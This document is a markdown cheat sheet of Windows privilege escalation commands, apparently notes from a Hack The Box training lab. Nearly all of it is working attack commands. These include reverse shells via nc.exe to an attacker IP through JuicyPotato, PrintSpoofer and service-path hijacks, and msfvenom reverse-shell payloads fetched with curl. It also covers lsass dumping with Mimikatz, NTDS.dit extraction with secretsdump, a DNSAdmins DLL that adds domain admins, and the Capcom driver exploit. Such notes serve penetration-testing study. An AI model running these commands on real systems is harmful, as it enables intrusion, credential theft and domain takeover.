# Windows Privilege Escalation

### Enumeration / Basics

```shell
xfreerdp /v:10.129.43.36 /u:htb-student

ipconfig /all
arp -a
route print
Get-MpComputerStatus
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone

tasklist /svc
tasklist | findstr /c:"2156" # fifnd by process id
set
systeminfo
wmic qfe
Get-HotFix | ft -AutoSize
wmic product get name
Get-WmiObject -Class Win32_Product |  select Name, Version
netstat -ano

query user
echo %USERNAME%
whoami /priv
whoami /groups
net user
net localgroup
net localgroup administrators
net accounts

pipelist.exe /accepteula
gci \\.\pipe\
cd C:\Tools\AcccessChk
accesschk.exe /accepteula \\.\Pipe\lsass -v
accesschk.exe -accepteula -w \pipe\WindscribeService -v

```

---

## Windows User Privileges

```shell
whoami
whoami /priv

```
### SeImpersonate - JuicyPotato
```shell
mssqlclient.py sql_dev@10.129.43.30 -windows-auth
enable_xp_cmdshell
xp_cmdshell whoami
xp_cmdshell whoami /priv
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
sudo nc -lnvp 8443

```
### SeAssignPrimaryToken - PrintSpoofer and RoguePotato
```shell
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
nc -lnvp 8443
```


### SeDebugPrivilege


```shell
whoami /priv
procdump.exe -accepteula -ma lsass.exe lsass.dmp # or go to the task manager click on lsass.exe create dump file
copy lsass.dmp C:\Tools\Mimikatz\x64\
mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
tasklist
```
### SeTakeOwnershipPrivilege
```shell
powershell
whoami /priv
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
whoami /priv

###
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
cmd /c dir /q 'C:\Department Shares\Private\IT'
###

takeown /f 'C:\Department Shares\Private\IT\cred.txt'

###
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
cat 'C:\Department Shares\Private\IT\cred.txt'
###

icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
cat 'C:\Department Shares\Private\IT\cred.txt'
```

---

### Windows Group Privileges

```shell
# Backup Operators - SeBackupPrivilege, SeRestore
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
whoami /priv
Set-SeBackupPrivilege
Get-SeBackupPrivilege
dir C:\Confidential\
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
cat 'C:\Confidential\2021 Contract.txt'


```
### attacking the NTDS.dit
```shel
diskshadow.exe
dir E:
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key

secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

#Robocopy
robocopy /B E:\Windows\NTDS .\ntds ntds.dit


```
### Event Log readers
```shell
net localgroup "Event Log Readers"
wevtutil qe Security /rd:true /f:text | Select-String "/user"
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}


```
### DNSAdmins
```shell
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
Get-ADGroupMember -Identity DnsAdmins
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
wmic useraccount where name="netadm" get sid
sc.exe sdshow DNS
sc stop dns
sc start dns
net group "Domain Admins" /dom

#cleanup
reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
sc.exe stop dns
sc.exe start dns
sc query dns
reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll

Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3



# Hyper-V Administrators
C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```

### Print Operators - SeLoadDriverPrivilege
```shell
whoami /priv

## add this to the top of the includes
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"

cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
EnableSeLoadDriverPrivilege.exe
.\ExploitCapcom.exe

##automating
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
.\ExploitCapcom.exe


```

### Server Operators - SeBackupPrivelege, SeRestorePrivilege
```shell
sc qc AppReadiness
c:\Tools\PsService.exe security AppReadiness
net localgroup Administrators
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
sc start AppReadiness
net localgroup Administrators

crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator

```

---

## Attacking the OS

### User Account Control - UAC

```shell
whoami /user
net localgroup administrators
whoami /priv

## check if uac is enabled
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

## check uac level
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

## check windows version
[environment]::OSVersion.Version

cmd /c echo %PATH%
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
tasklist /svc | findstr "rundll32"
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe

```

### Weak Permissions

```shell
.\SharpUp.exe audit
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

##replacing service binary
msfvenom -p windows/x64/shell_reverse_tcp LHOST=PWNIP LPORT=PWNPO -f exe > SecurityService.exe
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
sc start SecurityService

##changing service binary path
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
sc stop WindscribeService
sc start WindscribeService

##weak service permissions
SharpUp.exe audit
accesschk.exe /accepteula -quvcw WindscribeService
net localgroup administrators

##cleanup
sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
sc start WindScribeServicesc query WindScribeService
sc query WindScribeService

```

### Unquoted Service  Path
```shhell
sc qc SystemExplorerHelpService
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
```

### Kernel Exploits
```shell
```
